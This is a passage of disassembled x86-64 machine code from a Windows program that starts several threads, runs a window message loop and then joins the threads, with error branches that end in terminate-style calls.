   1400043f4:	4c 8b c8             	mov    %rax,%r9
   1400043f7:	4c 8d 05 62 21 00 00 	lea    0x2162(%rip),%r8        # 0x140006560
   1400043fe:	33 d2                	xor    %edx,%edx
   140004400:	48 89 08             	mov    %rcx,(%rax)
   140004403:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   140004407:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000440c:	33 c9                	xor    %ecx,%ecx
   14000440e:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004412:	ff 15 08 51 00 00    	call   *0x5108(%rip)        # 0x140009520
   140004418:	48 89 45 70          	mov    %rax,0x70(%rbp)
   14000441c:	48 85 c0             	test   %rax,%rax
   14000441f:	0f 84 81 07 00 00    	je     0x140004ba6
   140004425:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000442a:	e8 b9 2a 00 00       	call   0x140006ee8
   14000442f:	48 8d 0d 6a ed ff ff 	lea    -0x1296(%rip),%rcx        # 0x1400031a0
   140004436:	4c 8b c8             	mov    %rax,%r9
   140004439:	4c 8d 05 20 21 00 00 	lea    0x2120(%rip),%r8        # 0x140006560
   140004440:	33 d2                	xor    %edx,%edx
   140004442:	48 89 08             	mov    %rcx,(%rax)
   140004445:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   140004449:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000444e:	33 c9                	xor    %ecx,%ecx
   140004450:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004454:	ff 15 c6 50 00 00    	call   *0x50c6(%rip)        # 0x140009520
   14000445a:	48 89 45 60          	mov    %rax,0x60(%rbp)
   14000445e:	48 85 c0             	test   %rax,%rax
   140004461:	0f 84 30 07 00 00    	je     0x140004b97
   140004467:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000446c:	e8 77 2a 00 00       	call   0x140006ee8
   140004471:	48 8d 15 58 f2 ff ff 	lea    -0xda8(%rip),%rdx        # 0x1400036d0
   140004478:	4c 8b c8             	mov    %rax,%r9
   14000447b:	4c 8d 05 de 20 00 00 	lea    0x20de(%rip),%r8        # 0x140006560
   140004482:	33 c9                	xor    %ecx,%ecx
   140004484:	48 89 10             	mov    %rdx,(%rax)
   140004487:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   14000448b:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140004490:	33 d2                	xor    %edx,%edx
   140004492:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004496:	ff 15 84 50 00 00    	call   *0x5084(%rip)        # 0x140009520
   14000449c:	48 89 45 50          	mov    %rax,0x50(%rbp)
   1400044a0:	48 85 c0             	test   %rax,%rax
   1400044a3:	0f 84 df 06 00 00    	je     0x140004b88
   1400044a9:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400044ae:	e8 35 2a 00 00       	call   0x140006ee8
   1400044b3:	48 8d 0d 06 e9 ff ff 	lea    -0x16fa(%rip),%rcx        # 0x140002dc0
   1400044ba:	4c 8b c8             	mov    %rax,%r9
   1400044bd:	4c 8d 05 9c 20 00 00 	lea    0x209c(%rip),%r8        # 0x140006560
   1400044c4:	33 d2                	xor    %edx,%edx
   1400044c6:	48 89 08             	mov    %rcx,(%rax)
   1400044c9:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   1400044cd:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400044d2:	33 c9                	xor    %ecx,%ecx
   1400044d4:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400044d8:	ff 15 42 50 00 00    	call   *0x5042(%rip)        # 0x140009520
   1400044de:	48 89 45 40          	mov    %rax,0x40(%rbp)
   1400044e2:	48 85 c0             	test   %rax,%rax
   1400044e5:	0f 84 8e 06 00 00    	je     0x140004b79
   1400044eb:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400044ee:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   1400044f5:	45 33 c9             	xor    %r9d,%r9d
   1400044f8:	45 33 c0             	xor    %r8d,%r8d
   1400044fb:	33 d2                	xor    %edx,%edx
   1400044fd:	0f 11 85 60 01 00 00 	movups %xmm0,0x160(%rbp)
   140004504:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   14000450b:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   140004512:	ff 15 28 4e 00 00    	call   *0x4e28(%rip)        # 0x140009340
   140004518:	85 c0                	test   %eax,%eax
   14000451a:	74 40                	je     0x14000455c
   14000451c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004520:	40 38 35 8d 9b 00 00 	cmp    %sil,0x9b8d(%rip)        # 0x14000e0b4
   140004527:	74 33                	je     0x14000455c
   140004529:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140004530:	ff 15 92 4e 00 00    	call   *0x4e92(%rip)        # 0x1400093c8
   140004536:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   14000453d:	ff 15 45 4e 00 00    	call   *0x4e45(%rip)        # 0x140009388
   140004543:	45 33 c9             	xor    %r9d,%r9d
   140004546:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   14000454d:	45 33 c0             	xor    %r8d,%r8d
   140004550:	33 d2                	xor    %edx,%edx
   140004552:	ff 15 e8 4d 00 00    	call   *0x4de8(%rip)        # 0x140009340
   140004558:	85 c0                	test   %eax,%eax
   14000455a:	75 c4                	jne    0x140004520
   14000455c:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   140004562:	0f 84 05 06 00 00    	je     0x140004b6d
   140004568:	ff 15 c2 4c 00 00    	call   *0x4cc2(%rip)        # 0x140009230
   14000456e:	39 85 58 01 00 00    	cmp    %eax,0x158(%rbp)
   140004574:	0f 84 e7 05 00 00    	je     0x140004b61
   14000457a:	0f 28 85 50 01 00 00 	movaps 0x150(%rbp),%xmm0
   140004581:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004586:	33 d2                	xor    %edx,%edx
   140004588:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000458e:	ff 15 ac 4c 00 00    	call   *0x4cac(%rip)        # 0x140009240
   140004594:	85 c0                	test   %eax,%eax
   140004596:	0f 85 b9 05 00 00    	jne    0x140004b55
   14000459c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000459f:	66 0f 7f 85 50 01 00 	movdqa %xmm0,0x150(%rbp)
   1400045a6:	00 
   1400045a7:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   1400045ad:	0f 84 ba 05 00 00    	je     0x140004b6d
   1400045b3:	ff 15 77 4c 00 00    	call   *0x4c77(%rip)        # 0x140009230
   1400045b9:	39 85 48 01 00 00    	cmp    %eax,0x148(%rbp)
   1400045bf:	0f 84 9c 05 00 00    	je     0x140004b61
   1400045c5:	0f 28 85 40 01 00 00 	movaps 0x140(%rbp),%xmm0
   1400045cc:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400045d1:	33 d2                	xor    %edx,%edx
   1400045d3:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400045d9:	ff 15 61 4c 00 00    	call   *0x4c61(%rip)        # 0x140009240
   1400045df:	85 c0                	test   %eax,%eax
   1400045e1:	0f 85 6e 05 00 00    	jne    0x140004b55
   1400045e7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045ea:	66 0f 7f 85 40 01 00 	movdqa %xmm0,0x140(%rbp)
   1400045f1:	00 
   1400045f2:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   1400045f8:	0f 84 6f 05 00 00    	je     0x140004b6d
   1400045fe:	ff 15 2c 4c 00 00    	call   *0x4c2c(%rip)        # 0x140009230
   140004604:	39 85 38 01 00 00    	cmp    %eax,0x138(%rbp)
   14000460a:	0f 84 51 05 00 00    	je     0x140004b61
   140004610:	0f 28 85 30 01 00 00 	movaps 0x130(%rbp),%xmm0
   140004617:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000461c:	33 d2                	xor    %edx,%edx
   14000461e:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004624:	ff 15 16 4c 00 00    	call   *0x4c16(%rip)        # 0x140009240
   14000462a:	85 c0                	test   %eax,%eax
   14000462c:	0f 85 23 05 00 00    	jne    0x140004b55
   140004632:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004635:	66 0f 7f 85 30 01 00 	movdqa %xmm0,0x130(%rbp)
   14000463c:	00 
   14000463d:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   140004643:	0f 84 24 05 00 00    	je     0x140004b6d
   140004649:	ff 15 e1 4b 00 00    	call   *0x4be1(%rip)        # 0x140009230
   14000464f:	39 85 28 01 00 00    	cmp    %eax,0x128(%rbp)
   140004655:	0f 84 06 05 00 00    	je     0x140004b61
   14000465b:	0f 28 85 20 01 00 00 	movaps 0x120(%rbp),%xmm0
   140004662:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004667:	33 d2                	xor    %edx,%edx
   140004669:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   14000466f:	ff 15 cb 4b 00 00    	call   *0x4bcb(%rip)        # 0x140009240
   140004675:	85 c0                	test   %eax,%eax
   140004677:	0f 85 d8 04 00 00    	jne    0x140004b55
   14000467d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004680:	66 0f 7f 85 20 01 00 	movdqa %xmm0,0x120(%rbp)
   140004687:	00 
   140004688:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   14000468e:	0f 84 d9 04 00 00    	je     0x140004b6d
   140004694:	ff 15 96 4b 00 00    	call   *0x4b96(%rip)        # 0x140009230
   14000469a:	39 85 18 01 00 00    	cmp    %eax,0x118(%rbp)
   1400046a0:	0f 84 bb 04 00 00    	je     0x140004b61
   1400046a6:	0f 28 85 10 01 00 00 	movaps 0x110(%rbp),%xmm0
   1400046ad:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046b2:	33 d2                	xor    %edx,%edx
   1400046b4:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400046ba:	ff 15 80 4b 00 00    	call   *0x4b80(%rip)        # 0x140009240
   1400046c0:	85 c0                	test   %eax,%eax
   1400046c2:	0f 85 8d 04 00 00    	jne    0x140004b55
   1400046c8:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400046cb:	66 0f 7f 85 10 01 00 	movdqa %xmm0,0x110(%rbp)
   1400046d2:	00 
   1400046d3:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   1400046d9:	0f 84 8e 04 00 00    	je     0x140004b6d
   1400046df:	ff 15 4b 4b 00 00    	call   *0x4b4b(%rip)        # 0x140009230
   1400046e5:	39 85 a8 00 00 00    	cmp    %eax,0xa8(%rbp)
   1400046eb:	0f 84 70 04 00 00    	je     0x140004b61
   1400046f1:	0f 28 85 a0 00 00 00 	movaps 0xa0(%rbp),%xmm0
   1400046f8:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400046fd:	33 d2                	xor    %edx,%edx
   1400046ff:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004705:	ff 15 35 4b 00 00    	call   *0x4b35(%rip)        # 0x140009240
   14000470b:	85 c0                	test   %eax,%eax
   14000470d:	0f 85 42 04 00 00    	jne    0x140004b55
   140004713:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004716:	66 0f 7f 85 a0 00 00 	movdqa %xmm0,0xa0(%rbp)
   14000471d:	00 
   14000471e:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   140004724:	0f 84 43 04 00 00    	je     0x140004b6d
   14000472a:	ff 15 00 4b 00 00    	call   *0x4b00(%rip)        # 0x140009230
   140004730:	39 85 98 00 00 00    	cmp    %eax,0x98(%rbp)
   140004736:	0f 84 25 04 00 00    	je     0x140004b61
   14000473c:	0f 28 85 90 00 00 00 	movaps 0x90(%rbp),%xmm0
   140004743:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004748:	33 d2                	xor    %edx,%edx
   14000474a:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004750:	ff 15 ea 4a 00 00    	call   *0x4aea(%rip)        # 0x140009240
   140004756:	85 c0                	test   %eax,%eax
   140004758:	0f 85 f7 03 00 00    	jne    0x140004b55
   14000475e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004761:	66 0f 7f 85 90 00 00 	movdqa %xmm0,0x90(%rbp)
   140004768:	00 
   140004769:	39 75 68             	cmp    %esi,0x68(%rbp)
   14000476c:	0f 84 fb 03 00 00    	je     0x140004b6d
   140004772:	ff 15 b8 4a 00 00    	call   *0x4ab8(%rip)        # 0x140009230
   140004778:	39 45 68             	cmp    %eax,0x68(%rbp)
   14000477b:	0f 84 e0 03 00 00    	je     0x140004b61
   140004781:	0f 28 45 60          	movaps 0x60(%rbp),%xmm0
   140004785:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000478a:	33 d2                	xor    %edx,%edx
   14000478c:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004792:	ff 15 a8 4a 00 00    	call   *0x4aa8(%rip)        # 0x140009240
   140004798:	85 c0                	test   %eax,%eax
   14000479a:	0f 85 b5 03 00 00    	jne    0x140004b55
   1400047a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047a3:	66 0f 7f 45 60       	movdqa %xmm0,0x60(%rbp)
   1400047a8:	39 75 58             	cmp    %esi,0x58(%rbp)
   1400047ab:	0f 84 bc 03 00 00    	je     0x140004b6d
   1400047b1:	ff 15 79 4a 00 00    	call   *0x4a79(%rip)        # 0x140009230
   1400047b7:	39 45 58             	cmp    %eax,0x58(%rbp)
   1400047ba:	0f 84 a1 03 00 00    	je     0x140004b61
   1400047c0:	0f 28 45 50          	movaps 0x50(%rbp),%xmm0
   1400047c4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400047c9:	33 d2                	xor    %edx,%edx
   1400047cb:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400047d1:	ff 15 69 4a 00 00    	call   *0x4a69(%rip)        # 0x140009240
   1400047d7:	85 c0                	test   %eax,%eax
   1400047d9:	0f 85 76 03 00 00    	jne    0x140004b55
   1400047df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400047e2:	66 0f 7f 45 50       	movdqa %xmm0,0x50(%rbp)
   1400047e7:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   1400047ed:	0f 84 7a 03 00 00    	je     0x140004b6d
   1400047f3:	ff 15 37 4a 00 00    	call   *0x4a37(%rip)        # 0x140009230
   1400047f9:	39 85 08 01 00 00    	cmp    %eax,0x108(%rbp)
   1400047ff:	0f 84 5c 03 00 00    	je     0x140004b61
   140004805:	0f 28 85 00 01 00 00 	movaps 0x100(%rbp),%xmm0
   14000480c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004811:	33 d2                	xor    %edx,%edx
   140004813:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004819:	ff 15 21 4a 00 00    	call   *0x4a21(%rip)        # 0x140009240
   14000481f:	85 c0                	test   %eax,%eax
   140004821:	0f 85 2e 03 00 00    	jne    0x140004b55
   140004827:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000482a:	66 0f 7f 85 00 01 00 	movdqa %xmm0,0x100(%rbp)
   140004831:	00 
   140004832:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   140004838:	0f 84 2f 03 00 00    	je     0x140004b6d
   14000483e:	ff 15 ec 49 00 00    	call   *0x49ec(%rip)        # 0x140009230
   140004844:	39 85 f8 00 00 00    	cmp    %eax,0xf8(%rbp)
   14000484a:	0f 84 11 03 00 00    	je     0x140004b61
   140004850:	0f 28 85 f0 00 00 00 	movaps 0xf0(%rbp),%xmm0
   140004857:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000485c:	33 d2                	xor    %edx,%edx
   14000485e:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004864:	ff 15 d6 49 00 00    	call   *0x49d6(%rip)        # 0x140009240
   14000486a:	85 c0                	test   %eax,%eax
   14000486c:	0f 85 e3 02 00 00    	jne    0x140004b55
   140004872:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004875:	66 0f 7f 85 f0 00 00 	movdqa %xmm0,0xf0(%rbp)
   14000487c:	00 
   14000487d:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   140004883:	0f 84 e4 02 00 00    	je     0x140004b6d
   140004889:	ff 15 a1 49 00 00    	call   *0x49a1(%rip)        # 0x140009230
   14000488f:	39 85 e8 00 00 00    	cmp    %eax,0xe8(%rbp)
   140004895:	0f 84 c6 02 00 00    	je     0x140004b61
   14000489b:	0f 28 85 e0 00 00 00 	movaps 0xe0(%rbp),%xmm0
   1400048a2:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400048a7:	33 d2                	xor    %edx,%edx
   1400048a9:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400048af:	ff 15 8b 49 00 00    	call   *0x498b(%rip)        # 0x140009240
   1400048b5:	85 c0                	test   %eax,%eax
   1400048b7:	0f 85 98 02 00 00    	jne    0x140004b55
   1400048bd:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400048c0:	66 0f 7f 85 e0 00 00 	movdqa %xmm0,0xe0(%rbp)
   1400048c7:	00 
   1400048c8:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   1400048ce:	0f 84 99 02 00 00    	je     0x140004b6d
   1400048d4:	ff 15 56 49 00 00    	call   *0x4956(%rip)        # 0x140009230
   1400048da:	39 85 d8 00 00 00    	cmp    %eax,0xd8(%rbp)
   1400048e0:	0f 84 7b 02 00 00    	je     0x140004b61
   1400048e6:	0f 28 85 d0 00 00 00 	movaps 0xd0(%rbp),%xmm0
   1400048ed:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400048f2:	33 d2                	xor    %edx,%edx
   1400048f4:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400048fa:	ff 15 40 49 00 00    	call   *0x4940(%rip)        # 0x140009240
   140004900:	85 c0                	test   %eax,%eax
   140004902:	0f 85 4d 02 00 00    	jne    0x140004b55
   140004908:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000490b:	66 0f 7f 85 d0 00 00 	movdqa %xmm0,0xd0(%rbp)
   140004912:	00 
   140004913:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   140004919:	0f 84 4e 02 00 00    	je     0x140004b6d
   14000491f:	ff 15 0b 49 00 00    	call   *0x490b(%rip)        # 0x140009230
   140004925:	39 85 c8 00 00 00    	cmp    %eax,0xc8(%rbp)
   14000492b:	0f 84 30 02 00 00    	je     0x140004b61
   140004931:	0f 28 85 c0 00 00 00 	movaps 0xc0(%rbp),%xmm0
   140004938:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000493d:	33 d2                	xor    %edx,%edx
   14000493f:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004945:	ff 15 f5 48 00 00    	call   *0x48f5(%rip)        # 0x140009240
   14000494b:	85 c0                	test   %eax,%eax
   14000494d:	0f 85 02 02 00 00    	jne    0x140004b55
   140004953:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004956:	66 0f 7f 85 c0 00 00 	movdqa %xmm0,0xc0(%rbp)
   14000495d:	00 
   14000495e:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   140004964:	0f 84 03 02 00 00    	je     0x140004b6d
   14000496a:	ff 15 c0 48 00 00    	call   *0x48c0(%rip)        # 0x140009230
   140004970:	39 85 b8 00 00 00    	cmp    %eax,0xb8(%rbp)
   140004976:	0f 84 e5 01 00 00    	je     0x140004b61
   14000497c:	0f 28 85 b0 00 00 00 	movaps 0xb0(%rbp),%xmm0
   140004983:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004988:	33 d2                	xor    %edx,%edx
   14000498a:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004990:	ff 15 aa 48 00 00    	call   *0x48aa(%rip)        # 0x140009240
   140004996:	85 c0                	test   %eax,%eax
   140004998:	0f 85 b7 01 00 00    	jne    0x140004b55
   14000499e:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400049a1:	66 0f 7f 85 b0 00 00 	movdqa %xmm0,0xb0(%rbp)
   1400049a8:	00 
   1400049a9:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   1400049af:	0f 84 b8 01 00 00    	je     0x140004b6d
   1400049b5:	ff 15 75 48 00 00    	call   *0x4875(%rip)        # 0x140009230
   1400049bb:	39 85 88 00 00 00    	cmp    %eax,0x88(%rbp)
   1400049c1:	0f 84 9a 01 00 00    	je     0x140004b61
   1400049c7:	0f 28 85 80 00 00 00 	movaps 0x80(%rbp),%xmm0
   1400049ce:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400049d3:	33 d2                	xor    %edx,%edx
   1400049d5:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   1400049db:	ff 15 5f 48 00 00    	call   *0x485f(%rip)        # 0x140009240
   1400049e1:	85 c0                	test   %eax,%eax
   1400049e3:	0f 85 6c 01 00 00    	jne    0x140004b55
   1400049e9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400049ec:	66 0f 7f 85 80 00 00 	movdqa %xmm0,0x80(%rbp)
   1400049f3:	00 
   1400049f4:	39 75 78             	cmp    %esi,0x78(%rbp)
   1400049f7:	0f 84 70 01 00 00    	je     0x140004b6d
   1400049fd:	ff 15 2d 48 00 00    	call   *0x482d(%rip)        # 0x140009230
   140004a03:	39 45 78             	cmp    %eax,0x78(%rbp)
   140004a06:	0f 84 55 01 00 00    	je     0x140004b61
   140004a0c:	0f 28 45 70          	movaps 0x70(%rbp),%xmm0
   140004a10:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004a15:	33 d2                	xor    %edx,%edx
   140004a17:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004a1d:	ff 15 1d 48 00 00    	call   *0x481d(%rip)        # 0x140009240
   140004a23:	85 c0                	test   %eax,%eax
   140004a25:	0f 85 2a 01 00 00    	jne    0x140004b55
   140004a2b:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004a2e:	66 0f 7f 45 70       	movdqa %xmm0,0x70(%rbp)
   140004a33:	39 75 48             	cmp    %esi,0x48(%rbp)
   140004a36:	0f 84 31 01 00 00    	je     0x140004b6d
   140004a3c:	ff 15 ee 47 00 00    	call   *0x47ee(%rip)        # 0x140009230
   140004a42:	39 45 48             	cmp    %eax,0x48(%rbp)
   140004a45:	0f 84 16 01 00 00    	je     0x140004b61
   140004a4b:	0f 28 45 40          	movaps 0x40(%rbp),%xmm0
   140004a4f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004a54:	33 d2                	xor    %edx,%edx
   140004a56:	66 0f 7f 44 24 60    	movdqa %xmm0,0x60(%rsp)
   140004a5c:	ff 15 de 47 00 00    	call   *0x47de(%rip)        # 0x140009240
   140004a62:	85 c0                	test   %eax,%eax
   140004a64:	0f 85 eb 00 00 00    	jne    0x140004b55
   140004a6a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004a6d:	ba 01 00 00 00       	mov    $0x1,%edx
   140004a72:	48 8b cf             	mov    %rdi,%rcx
   140004a75:	66 0f 7f 45 40       	movdqa %xmm0,0x40(%rbp)
   140004a7a:	ff 15 90 48 00 00    	call   *0x4890(%rip)        # 0x140009310
   140004a80:	39 75 48             	cmp    %esi,0x48(%rbp)
   140004a83:	0f 85 c5 00 00 00    	jne    0x140004b4e
   140004a89:	39 75 58             	cmp    %esi,0x58(%rbp)
   140004a8c:	0f 85 bc 00 00 00    	jne    0x140004b4e
   140004a92:	39 75 68             	cmp    %esi,0x68(%rbp)
   140004a95:	0f 85 b3 00 00 00    	jne    0x140004b4e
   140004a9b:	39 75 78             	cmp    %esi,0x78(%rbp)
   140004a9e:	0f 85 aa 00 00 00    	jne    0x140004b4e
   140004aa4:	39 b5 88 00 00 00    	cmp    %esi,0x88(%rbp)
   140004aaa:	0f 85 9e 00 00 00    	jne    0x140004b4e
   140004ab0:	39 b5 98 00 00 00    	cmp    %esi,0x98(%rbp)
   140004ab6:	0f 85 92 00 00 00    	jne    0x140004b4e
   140004abc:	39 b5 a8 00 00 00    	cmp    %esi,0xa8(%rbp)
   140004ac2:	0f 85 86 00 00 00    	jne    0x140004b4e
   140004ac8:	39 b5 b8 00 00 00    	cmp    %esi,0xb8(%rbp)
   140004ace:	75 7e                	jne    0x140004b4e
   140004ad0:	39 b5 c8 00 00 00    	cmp    %esi,0xc8(%rbp)
   140004ad6:	75 76                	jne    0x140004b4e
   140004ad8:	39 b5 d8 00 00 00    	cmp    %esi,0xd8(%rbp)
   140004ade:	75 6e                	jne    0x140004b4e
   140004ae0:	39 b5 e8 00 00 00    	cmp    %esi,0xe8(%rbp)
   140004ae6:	75 66                	jne    0x140004b4e
   140004ae8:	39 b5 f8 00 00 00    	cmp    %esi,0xf8(%rbp)
   140004aee:	75 5e                	jne    0x140004b4e
   140004af0:	39 b5 08 01 00 00    	cmp    %esi,0x108(%rbp)
   140004af6:	75 56                	jne    0x140004b4e
   140004af8:	39 b5 18 01 00 00    	cmp    %esi,0x118(%rbp)
   140004afe:	75 4e                	jne    0x140004b4e
   140004b00:	39 b5 28 01 00 00    	cmp    %esi,0x128(%rbp)
   140004b06:	75 46                	jne    0x140004b4e
   140004b08:	39 b5 38 01 00 00    	cmp    %esi,0x138(%rbp)
   140004b0e:	75 3e                	jne    0x140004b4e
   140004b10:	39 b5 48 01 00 00    	cmp    %esi,0x148(%rbp)
   140004b16:	75 36                	jne    0x140004b4e
   140004b18:	39 b5 58 01 00 00    	cmp    %esi,0x158(%rbp)
   140004b1e:	75 2e                	jne    0x140004b4e
   140004b20:	33 c0                	xor    %eax,%eax
   140004b22:	48 8b 8d e0 09 00 00 	mov    0x9e0(%rbp),%rcx
   140004b29:	48 33 cc             	xor    %rsp,%rcx
   140004b2c:	e8 8f 23 00 00       	call   0x140006ec0
   140004b31:	4c 8d 9c 24 f0 0a 00 	lea    0xaf0(%rsp),%r11
   140004b38:	00 
   140004b39:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004b3d:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004b41:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140004b45:	49 8b e3             	mov    %r11,%rsp
   140004b48:	41 5f                	pop    %r15
   140004b4a:	41 5e                	pop    %r14
   140004b4c:	5d                   	pop    %rbp
   140004b4d:	c3                   	ret
   140004b4e:	ff 15 f4 49 00 00    	call   *0x49f4(%rip)        # 0x140009548
   140004b54:	cc                   	int3
   140004b55:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004b5a:	ff 15 90 46 00 00    	call   *0x4690(%rip)        # 0x1400091f0
   140004b60:	cc                   	int3
   140004b61:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004b66:	ff 15 84 46 00 00    	call   *0x4684(%rip)        # 0x1400091f0
   140004b6c:	cc                   	int3
   140004b6d:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004b72:	ff 15 78 46 00 00    	call   *0x4678(%rip)        # 0x1400091f0
   140004b78:	cc                   	int3
   140004b79:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b7e:	89 75 48             	mov    %esi,0x48(%rbp)
   140004b81:	ff 15 69 46 00 00    	call   *0x4669(%rip)        # 0x1400091f0
   140004b87:	cc                   	int3
   140004b88:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b8d:	89 75 58             	mov    %esi,0x58(%rbp)
   140004b90:	ff 15 5a 46 00 00    	call   *0x465a(%rip)        # 0x1400091f0
   140004b96:	cc                   	int3
   140004b97:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004b9c:	89 75 68             	mov    %esi,0x68(%rbp)
   140004b9f:	ff 15 4b 46 00 00    	call   *0x464b(%rip)        # 0x1400091f0
   140004ba5:	cc                   	int3
   140004ba6:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004bab:	89 75 78             	mov    %esi,0x78(%rbp)
   140004bae:	ff 15 3c 46 00 00    	call   *0x463c(%rip)        # 0x1400091f0
   140004bb4:	cc                   	int3
   140004bb5:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004bba:	89 b5 88 00 00 00    	mov    %esi,0x88(%rbp)
   140004bc0:	ff 15 2a 46 00 00    	call   *0x462a(%rip)        # 0x1400091f0
   140004bc6:	cc                   	int3
   140004bc7:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004bcc:	89 b5 98 00 00 00    	mov    %esi,0x98(%rbp)
   140004bd2:	ff 15 18 46 00 00    	call   *0x4618(%rip)        # 0x1400091f0
   140004bd8:	cc                   	int3
   140004bd9:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004bde:	89 b5 a8 00 00 00    	mov    %esi,0xa8(%rbp)
   140004be4:	ff 15 06 46 00 00    	call   *0x4606(%rip)        # 0x1400091f0
   140004bea:	cc                   	int3
   140004beb:	b9 06 00 00 00       	mov    $0x6,%ecx
   140004bf0:	89 b5 b8 00 00 00    	mov    %esi,0xb8(%rbp)
   140004bf6:	ff 15 f4 45 00 00    	call   *0x45f4(%rip)        # 0x1400091f0
   140004bfc:	cc                   	int3
   140004bfd:	b9 06 00 00 00       	mov    $0x6,%ecx
